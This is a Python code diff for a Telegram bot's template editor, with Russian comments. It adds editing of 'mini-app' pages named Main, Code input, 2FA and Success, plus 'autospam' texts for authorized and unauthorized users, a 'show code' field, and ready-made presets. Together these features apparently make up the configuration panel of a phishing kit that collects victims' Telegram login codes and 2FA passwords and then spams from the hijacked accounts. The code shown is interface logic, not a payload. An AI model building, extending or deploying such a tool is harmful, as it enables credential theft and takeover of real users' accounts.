@@ -6,16 +6,18 @@
  ботам (таблица templates, owner_id). Бот ссылается на выбранный шаблон
  через bots.template_id.
 
- Меню шаблонов:
-   📋 Меню шаблонов:
-   [ Шаблон 1 ]  [ Шаблон 2 ] ...    ← список общих шаблонов (✅ — текущий)
-   [⚙️ Создать шаблон] [➕ Стандартный шаблон]
-   [💎 Шаблоны мини-апп]
-   [📥 Добавить по коду] [⬅️ Назад]
+ Редактор «Стандартного шаблона мини-апп» объединяет три части
+ (перенесены из автономного бота-конструктора, см. miniapp_template.py):
 
- Редактор шаблона — поля из макета (тексты, кнопки, страницы,
- уникализация…). Поля пока заглушки, наполняем по очереди; копия и
- удаление уже работают.
+   • Разделы корневого шаблона — тексты/кнопки ответов бота
+     (Ответ на /start, Кнопка запуска, Просрочка, Автоспам, …);
+   • Листы мини-аппа — 4 страницы (Главная / Ввод кода / 2FA / Успех),
+     у каждой свои под-поля (эмодзи, текст кнопки, текст, подсказки…);
+   • Действия (оформление) — фон, блюр, цвет интерфейса.
+
+ Данные хранятся в JSON-content шаблона: разделы — по своему ключу,
+ под-поля страниц — по ключу f"{page}_{field}". Пустое значение поля
+ означает «использовать дефолт» (см. miniapp_template.ALL_DEFAULTS).
 ========================================================================
 """
 
@@ -48,6 +50,18 @@ from database import (
 )
 from handlers.cards import owns
 from handlers.ui import edit_anchor, remember_anchor
+from miniapp_template import (
+    ALL_DEFAULTS,
+    COLORS,
+    DEFAULT_VIEW,
+    PAGE_FIELDS,
+    PAGES,
+    PRESETS,
+    SHORT_SUBFIELDS,
+    VIEWS,
+    default_content,
+    page_field_key,
+)
 
 router = Router()
 
@@ -55,13 +69,14 @@ router = Router()
 class TemplateEdit(StatesGroup):
     waiting_for_text = State()
     waiting_for_code = State()
+    waiting_for_name = State()  # ввод названия при создании шаблона
 
 
 def _ensure_templates(owner_id: int) -> list[dict]:
     """Гарантируем, что у владельца есть хотя бы один шаблон."""
     templates = get_owner_templates(owner_id)
     if not templates:
-        create_template(owner_id, "Стандартный шаблон", "standard")
+        create_template(owner_id, "Стандартный шаблон", "standard", default_content())
         templates = get_owner_templates(owner_id)
     return templates
 
@@ -81,7 +96,7 @@ def _menu_kb(bot: dict, templates: list[dict]) -> InlineKeyboardMarkup:
         )
     b.row(
         InlineKeyboardButton(
-            text="⚙️ Создать шаблон", callback_data=f"tpl_soon:{bid}:create"
+            text="⚙️ Создать шаблон", callback_data=f"tpl_create:{bid}"
         ),
         InlineKeyboardButton(
             text="➕ Стандартный шаблон", callback_data=f"tpl_new:{bid}"
@@ -89,7 +104,7 @@ def _menu_kb(bot: dict, templates: list[dict]) -> InlineKeyboardMarkup:
     )
     b.row(
         InlineKeyboardButton(
-            text="💎 Шаблоны мини-апп", callback_data=f"tpl_soon:{bid}:miniapp"
+            text="💎 Шаблоны мини-апп", callback_data=f"tpl_gallery:{bid}"
         )
     )
     b.row(
@@ -132,6 +147,8 @@ _TEXT_FIELDS: dict[str, str] = {
     "admin_post": "Пост админ канала",
     "spam_auth": "Автоспам авторизованные",
     "spam_unauth": "Автоспам неавторизованные",
+    "show_auth": "Показ успешной авторизации",
+    "show_code": "📋 Показ кода",
 }
 
 # Поля-кнопки: редактируется подпись кнопки.
@@ -140,36 +157,30 @@ _BUTTON_FIELDS: dict[str, str] = {
     "expired_btn": "Кнопка просрочки",
 }
 
-# Поля страниц мини-аппа (тексты страниц + фон/цвет).
-_PAGE_FIELDS: dict[str, str] = {
-    "page_main": "Главная страница",
-    "page_code": "Страница ввода кода",
-    "page_2fa": "Страница с 2FA",
-    "page_success": "Страница успешной авторизации",
-    "bg": "Фон (URL картинки)",
-    "ui_color": "Цвет интерфейса (HEX, напр. #2ea6ff)",
+# Под-поля страниц мини-аппа: ключ content -> (page, field, имя для редактора).
+_PAGE_SUBFIELDS: dict[str, tuple[str, str, str]] = {
+    page_field_key(page, field): (page, field, f"{PAGES[page]} · {label}")
+    for page, fields in PAGE_FIELDS.items()
+    for field, label in fields
 }
 
-# act из подменю страниц → ключ поля в content
-_PAGE_FIELD_MAP: dict[str, str] = {
-    "main": "page_main",
-    "code": "page_code",
-    "twofa": "page_2fa",
-    "success": "page_success",
-    "bg": "bg",
-    "color": "ui_color",
-}
-
-# Всё, что редактируется одним текстовым вводом (+ спец-поле «name»).
+# Всё, что редактируется одним текстовым вводом (+ спец-поля «bg», «name»).
 _EDITABLE: dict[str, str] = {
     **_TEXT_FIELDS,
     **_BUTTON_FIELDS,
-    **_PAGE_FIELDS,
+    **{key: meta[2] for key, meta in _PAGE_SUBFIELDS.items()},
+    "bg": "Фон (URL картинки)",
+    "app_name": "Название приложения",
     "name": "Название",
 }
 
-# подписи кнопок по умолчанию (если не заданы в шаблоне)
-DEFAULT_START_BTN = "Подтвердить ✅"
+
+def _is_button_like(field: str) -> bool:
+    """Поле редактируется как короткая подпись/эмодзи (без HTML-разметки)."""
+    if field in _BUTTON_FIELDS or field == "app_name":
+        return True
+    meta = _PAGE_SUBFIELDS.get(field)
+    return bool(meta and meta[1] in SHORT_SUBFIELDS)
 
 
 def _std_text(template: dict) -> str:
@@ -207,6 +218,12 @@ def _std_kb(bid: int, tid: int) -> InlineKeyboardMarkup:
     )
     b.row(
         InlineKeyboardButton(
+            text="📲 Название приложения",
+            callback_data=f"std_act:{bid}:{tid}:app_name",
+        )
+    )
+    b.row(
+        InlineKeyboardButton(
             text="🎨 Оформление бота", callback_data=f"std_act:{bid}:{tid}:design"
         )
     )
@@ -226,11 +243,13 @@ async def _show_editor(callback: CallbackQuery, bid: int, template: dict) -> Non
 
 
 # ---------------------------------------------- страницы мини-апп шаблона
+# Подменю «Страницы мини-апп»: список листов + оформление (фон/блюр/цвет).
 _PAGE_ROWS: list[tuple[str, str]] = [
     ("Главная страница", "main"),
     ("Страница ввода кода", "code"),
     ("Страница с 2FA", "twofa"),
     ("Страница успешной авторизации", "success"),
+    ("🎭 Вид (вёрстка)", "view"),
     ("🖼 Фон", "bg"),
     ("💨 Блюр фона", "blur"),
     ("🎨 Цвет интерфейса", "color"),
@@ -254,10 +273,118 @@ def _pages_kb(bid: int, tid: int, content: dict) -> InlineKeyboardMarkup:
     return b.as_markup()
 
 
+def _pages_text(template: dict) -> str:
+    c = template["content"]
+    view = VIEWS.get(c.get("view") or DEFAULT_VIEW, VIEWS[DEFAULT_VIEW])
+    color = COLORS.get(c.get("ui_color") or "default", COLORS["default"])[1]
+    blur = int(c.get("blur") or 0)
+    bg = "установлен" if (c.get("bg") or "").strip() else "не установлен"
+    return (
+        f"💎 <b>Страницы мини-апп шаблона «{template['name']}»:</b>\n\n"
+        f"🎭 Вид: <b>{escape(view)}</b>\n"
+        f"🎨 Цвет: <b>{escape(color)}</b>\n"
+        f"💨 Блюр: <b>{blur}px</b>\n"
+        f"🖼 Фон: <b>{bg}</b>"
+    )
+
+
 async def _show_pages(callback: CallbackQuery, bid: int, template: dict) -> None:
     await callback.message.edit_text(
-        f"💎 <b>Страницы мини-апп шаблона «{template['name']}»:</b>",
+        _pages_text(template),
         reply_markup=_pages_kb(bid, template["id"], template["content"]),
+    )
+
+
+# ----------------------------------------- карточка листа (под-поля страницы)
+def _page_card_kb(bid: int, tid: int, page: str) -> InlineKeyboardMarkup:
+    b = InlineKeyboardBuilder()
+    for field, label in PAGE_FIELDS[page]:
+        key = page_field_key(page, field)
+        b.row(
+            InlineKeyboardButton(
+                text=label, callback_data=f"pf_act:{bid}:{tid}:{key}"
+            )
+        )
+    b.row(
+        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"tpl_pages:{bid}:{tid}")
+    )
+    return b.as_markup()
+
+
+def _page_card_text(page: str, template: dict) -> str:
+    lines = [f"💎 <b>{PAGES[page]}</b>", ""]
+    for field, label in PAGE_FIELDS[page]:
+        value = _field_value(page_field_key(page, field), template).strip()
+        shown = escape(value) if value else "<i>не задано</i>"
+        lines.append(f"<b>{label}:</b>\n{shown}\n")
+    return "\n".join(lines).strip()
+
+
+async def _show_page_card(
+    callback: CallbackQuery, bid: int, template: dict, page: str
+) -> None:
+    await callback.message.edit_text(
+        _page_card_text(page, template),
+        reply_markup=_page_card_kb(bid, template["id"], page),
+    )
+
+
+# ------------------------------------------------- цвет интерфейса мини-аппа
+def _colors_kb(bid: int, tid: int, current: str) -> InlineKeyboardMarkup:
+    b = InlineKeyboardBuilder()
+    items = list(COLORS.items())
+    for i in range(0, len(items), 2):
+        row = []
+        for cid, (emoji, name) in items[i : i + 2]:
+            mark = "✅ " if cid == current else ""
+            row.append(
+                InlineKeyboardButton(
+                    text=f"{mark}{emoji} {name}".strip(),
+                    callback_data=f"pgcol:{bid}:{tid}:{cid}",
+                )
+            )
+        b.row(*row)
+    b.row(
+        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"tpl_pages:{bid}:{tid}")
+    )
+    return b.as_markup()
+
+
+async def _show_colors(callback: CallbackQuery, bid: int, template: dict) -> None:
+    current = template["content"].get("ui_color") or "default"
+    name = COLORS.get(current, COLORS["default"])[1]
+    await callback.message.edit_text(
+        "🎨 <b>Цвет интерфейса мини-аппа</b>\n\n"
+        f"Текущий: <b>{escape(name)}</b>\n"
+        "Выберите цвет:",
+        reply_markup=_colors_kb(bid, template["id"], current),
+    )
+
+
+# ----------------------------------------------------- вид (вёрстка страниц)
+def _views_kb(bid: int, tid: int, current: str) -> InlineKeyboardMarkup:
+    b = InlineKeyboardBuilder()
+    for vid, name in VIEWS.items():
+        mark = "✅ " if vid == current else ""
+        b.row(
+            InlineKeyboardButton(
+                text=f"{mark}{name}", callback_data=f"pgview:{bid}:{tid}:{vid}"
+            )
+        )
+    b.row(
+        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"tpl_pages:{bid}:{tid}")
+    )
+    return b.as_markup()
+
+
+async def _show_views(callback: CallbackQuery, bid: int, template: dict) -> None:
+    current = template["content"].get("view") or DEFAULT_VIEW
+    name = VIEWS.get(current, VIEWS[DEFAULT_VIEW])
+    await callback.message.edit_text(
+        "🎭 <b>Вид мини-аппа (вёрстка страниц)</b>\n\n"
+        f"Текущий: <b>{escape(name)}</b>\n"
+        "Выберите оформление страниц:",
+        reply_markup=_views_kb(bid, template["id"], current),
     )
 
 
@@ -298,7 +425,7 @@ async def new_template(callback: CallbackQuery) -> None:
         return
     existing = get_owner_templates(callback.from_user.id)
     name = f"Стандартный шаблон {len(existing) + 1}"
-    tid = create_template(callback.from_user.id, name, "standard")
+    tid = create_template(callback.from_user.id, name, "standard", default_content())
     set_bot_template(bid, tid)
     await _show_editor(callback, bid, get_template(tid))
     await callback.answer("Шаблон создан ✅")
@@ -356,7 +483,7 @@ async def open_pages(callback: CallbackQuery) -> None:
 
 @router.callback_query(F.data.startswith("pg_act:"))
 async def page_action(callback: CallbackQuery) -> None:
-    res = _resolve(callback)  # field = act из подменю
+    res = _resolve(callback)  # act из подменю страниц
     if res is None:
         await callback.answer("Не найдено.", show_alert=True)
         return
@@ -368,19 +495,102 @@ async def page_action(callback: CallbackQuery) -> None:
         await _show_pages(callback, bid, get_template(tid))
         await callback.answer(f"Блюр: {nxt}px")
         return
-    field = _PAGE_FIELD_MAP.get(act)
-    if field is None:
-        await callback.answer("🚧 В разработке", show_alert=True)
+    if act == "color":
+        await _show_colors(callback, bid, template)
+        await callback.answer()
+        return
+    if act == "view":
+        await _show_views(callback, bid, template)
+        await callback.answer()
+        return
+    if act == "bg":
+        await _show_field(callback, bid, template, "bg")
+        await callback.answer()
+        return
+    if act in PAGES:
+        await _show_page_card(callback, bid, template, act)
+        await callback.answer()
+        return
+    await callback.answer("🚧 В разработке", show_alert=True)
+
+
+@router.callback_query(F.data.startswith("pgcard:"))
+async def open_page_card(callback: CallbackQuery) -> None:
+    _, bid_s, tid_s, page = callback.data.split(":")
+    bid, tid = int(bid_s), int(tid_s)
+    bot = get_bot(bid)
+    if not owns(callback.from_user.id, bot):
+        await callback.answer("Бот не найден.", show_alert=True)
+        return
+    template = get_template(tid)
+    if template is None or template["owner_id"] != callback.from_user.id:
+        await callback.answer("Шаблон не найден.", show_alert=True)
+        return
+    if page not in PAGES:
+        await callback.answer("Лист не найден.", show_alert=True)
+        return
+    await _show_page_card(callback, bid, template, page)
+    await callback.answer()
+
+
+@router.callback_query(F.data.startswith("pf_act:"))
+async def page_field_action(callback: CallbackQuery) -> None:
+    res = _resolve(callback)  # field = ключ под-поля, напр. main_text
+    if res is None:
+        await callback.answer("Не найдено.", show_alert=True)
+        return
+    bid, tid, field, bot, template = res
+    if field not in _PAGE_SUBFIELDS:
+        await callback.answer("Поле не найдено.", show_alert=True)
         return
     await _show_field(callback, bid, template, field)
     await callback.answer()
+
+
+@router.callback_query(F.data.startswith("pgcol:"))
+async def set_color(callback: CallbackQuery) -> None:
+    _, bid_s, tid_s, cid = callback.data.split(":")
+    bid, tid = int(bid_s), int(tid_s)
+    bot = get_bot(bid)
+    if not owns(callback.from_user.id, bot):
+        await callback.answer("Бот не найден.", show_alert=True)
+        return
+    template = get_template(tid)
+    if template is None or template["owner_id"] != callback.from_user.id:
+        await callback.answer("Шаблон не найден.", show_alert=True)
+        return
+    if cid not in COLORS:
+        await callback.answer("Неизвестный цвет.", show_alert=True)
+        return
+    update_template_content(tid, "ui_color", cid)
+    await _show_colors(callback, bid, get_template(tid))
+    await callback.answer(f"Цвет: {COLORS[cid][1]}")
+
+
+@router.callback_query(F.data.startswith("pgview:"))
+async def set_view(callback: CallbackQuery) -> None:
+    res = _resolve(callback)  # field = id вида
+    if res is None:
+        await callback.answer("Не найдено.", show_alert=True)
+        return
+    bid, tid, vid, bot, template = res
+    if vid not in VIEWS:
+        await callback.answer("Неизвестный вид.", show_alert=True)
+        return
+    update_template_content(tid, "view", vid)
+    await _show_views(callback, bid, get_template(tid))
+    await callback.answer(f"Вид: {VIEWS[vid]}")
 
 
 # ----------------------------------------------- редактор поля (текст/кнопка/название)
 def _field_value(field: str, template: dict) -> str:
     if field == "name":
         return template["name"]
-    return template["content"].get(field) or ""
+    val = template["content"].get(field)
+    if val is None:
+        # поле ещё не трогали — показываем осмысленный дефолт
+        return ALL_DEFAULTS.get(field, "")
+    return val
 
 
 def _field_kb(bid: int, tid: int, field: str, has_value: bool) -> InlineKeyboardMarkup:
@@ -397,8 +607,14 @@ def _field_kb(bid: int, tid: int, field: str, has_value: bool) -> InlineKeyboard
                 text="🗑 Очистить", callback_data=f"fld_clr:{bid}:{tid}:{field}"
             )
         )
-    # поля страниц возвращают в подменю страниц, остальные — в редактор
-    back = f"tpl_pages:{bid}:{tid}" if field in _PAGE_FIELDS else f"std_open:{bid}:{tid}"
+    # куда возвращаемся «Назад»: под-поле → карточка листа, фон → подменю
+    # страниц, остальное → редактор шаблона
+    if field in _PAGE_SUBFIELDS:
+        back = f"pgcard:{bid}:{tid}:{_PAGE_SUBFIELDS[field][0]}"
+    elif field == "bg":
+        back = f"tpl_pages:{bid}:{tid}"
+    else:
+        back = f"std_open:{bid}:{tid}"
     b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=back))
     return b.as_markup()
 
@@ -406,10 +622,10 @@ def _field_kb(bid: int, tid: int, field: str, has_value: bool) -> InlineKeyboard
 def _field_text(field: str, template: dict) -> str:
     label = _EDITABLE[field]
     value = _field_value(field, template).strip()
-    if field == "name":
+    if field in ("name", "app_name"):
         kind = "Название"
-    elif field in _BUTTON_FIELDS:
-        kind = "Подпись кнопки"
+    elif _is_button_like(field):
+        kind = "Значение"
     else:
         kind = "Текст"
     if value:
@@ -500,6 +716,11 @@ async def std_action(callback: CallbackQuery) -> None:
         await _show_code(callback, bid, template)
         await callback.answer()
         return
+    if field == "design":
+        # «Оформление бота» — фон / блюр / цвет интерфейса (подменю страниц)
+        await _show_pages(callback, bid, template)
+        await callback.answer()
+        return
     await callback.answer("🚧 В разработке", show_alert=True)
 
 
@@ -552,6 +773,91 @@ def _resolve_bt(callback: CallbackQuery) -> tuple[int, int, dict] | None:
     if template is None or template["owner_id"] != callback.from_user.id:
         return None
     return bid, tid, template
+
+
+# --------------------------------------------------- создать шаблон (с именем)
+@router.callback_query(F.data.startswith("tpl_create:"))
+async def create_template_start(callback: CallbackQuery, state: FSMContext) -> None:
+    bid = int(callback.data.split(":")[1])
+    bot = get_bot(bid)
+    if not owns(callback.from_user.id, bot):
+        await callback.answer("Бот не найден.", show_alert=True)
+        return
+    await state.set_state(TemplateEdit.waiting_for_name)
+    await state.update_data(bid=bid)
+    await remember_anchor(callback, state)
+    await callback.message.edit_text(
+        "⚙️ <b>Создание шаблона</b>\n\nПришлите название нового шаблона:",
+        reply_markup=InlineKeyboardMarkup(
+            inline_keyboard=[
+                [InlineKeyboardButton(text="⬅️ Отмена", callback_data=f"template:{bid}")]
+            ]
+        ),
+    )
+    await callback.answer()
+
+
+@router.message(TemplateEdit.waiting_for_name, F.text)
+async def create_template_save(message: Message, state: FSMContext) -> None:
+    data = await state.get_data()
+    await state.clear()
+    bid = data.get("bid")
+    name = message.text.strip()[:60] or "Новый шаблон"
+    tid = create_template(message.from_user.id, name, "standard", default_content())
+    if bid:
+        set_bot_template(bid, tid)
+    template = get_template(tid)
+    if template is None:
+        return
+    # открываем редактор только что созданного шаблона
+    await edit_anchor(
+        message, data, _std_text(template), _std_kb(bid, template["id"])
+    )
+
+
+# --------------------------------------------------- готовые шаблоны мини-апп
+@router.callback_query(F.data.startswith("tpl_gallery:"))
+async def gallery(callback: CallbackQuery) -> None:
+    bid = int(callback.data.split(":")[1])
+    bot = get_bot(bid)
+    if not owns(callback.from_user.id, bot):
+        await callback.answer("Бот не найден.", show_alert=True)
+        return
+    b = InlineKeyboardBuilder()
+    for p in PRESETS:
+        b.row(
+            InlineKeyboardButton(
+                text=f"💎 {p['name']}", callback_data=f"tpl_use:{bid}:{p['id']}"
+            )
+        )
+    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"template:{bid}"))
+    await callback.message.edit_text(
+        "💎 <b>Шаблоны мини-апп</b>\n\n"
+        "Готовые шаблоны со своими текстами. Выберите — добавится копия, "
+        "её можно дальше редактировать:",
+        reply_markup=b.as_markup(),
+    )
+    await callback.answer()
+
+
+@router.callback_query(F.data.startswith("tpl_use:"))
+async def use_preset(callback: CallbackQuery) -> None:
+    _, bid_s, pid = callback.data.split(":")
+    bid = int(bid_s)
+    bot = get_bot(bid)
+    if not owns(callback.from_user.id, bot):
+        await callback.answer("Бот не найден.", show_alert=True)
+        return
+    preset = next((p for p in PRESETS if p["id"] == pid), None)
+    if preset is None:
+        await callback.answer("Шаблон не найден.", show_alert=True)
+        return
+    tid = create_template(
+        callback.from_user.id, preset["name"], "standard", preset["content"]
+    )
+    set_bot_template(bid, tid)
+    await _show_editor(callback, bid, get_template(tid))
+    await callback.answer("Шаблон добавлен ✅")
 
 
 # --------------------------------------------------- добавить по коду
@@ -656,18 +962,25 @@ async def field_edit(callback: CallbackQuery, state: FSMContext) -> None:
     await remember_anchor(callback, state)
     if field == "name":
         hint = "Пришлите новое название шаблона:"
-    elif field in _BUTTON_FIELDS:
-        hint = f"Пришлите подпись кнопки «{_EDITABLE[field]}»:"
+    elif _is_button_like(field):
+        hint = f"Пришлите значение для «{escape(_EDITABLE[field])}»:"
     else:
         hint = (
-            f"Пришлите новый текст для «{_EDITABLE[field]}».\n\n"
-            "Можно с HTML-разметкой (<b>, <i>, <a> …)."
+            f"Пришлите новый текст для «{escape(_EDITABLE[field])}».\n\n"
+            "Можно с HTML-разметкой (&lt;b&gt;, &lt;i&gt;, &lt;a&gt; …)."
         )
+    # «Отмена» возвращает к просмотру того же поля
+    if field in _PAGE_SUBFIELDS:
+        cancel = f"pf_act:{bid}:{tid}:{field}"
+    elif field == "bg":
+        cancel = f"pg_act:{bid}:{tid}:bg"
+    else:
+        cancel = f"std_act:{bid}:{tid}:{field}"
     await callback.message.edit_text(
         f"✏️ {hint}",
         reply_markup=InlineKeyboardMarkup(
             inline_keyboard=[
-                [InlineKeyboardButton(text="⬅️ Отмена", callback_data=f"std_act:{bid}:{tid}:{field}")]
+                [InlineKeyboardButton(text="⬅️ Отмена", callback_data=cancel)]
             ]
         ),
     )
@@ -695,8 +1008,8 @@ async def field_save(message: Message, state: FSMContext) -> None:
         return
     if field == "name":
         rename_template(tid, message.text.strip()[:60])
-    elif field in _BUTTON_FIELDS:
-        # подпись кнопки — без HTML
+    elif _is_button_like(field):
+        # подпись кнопки / эмодзи — без HTML
         update_template_content(tid, field, message.text.strip()[:64])
     else:
         # текст сообщения — «как есть», с HTML-разметкой
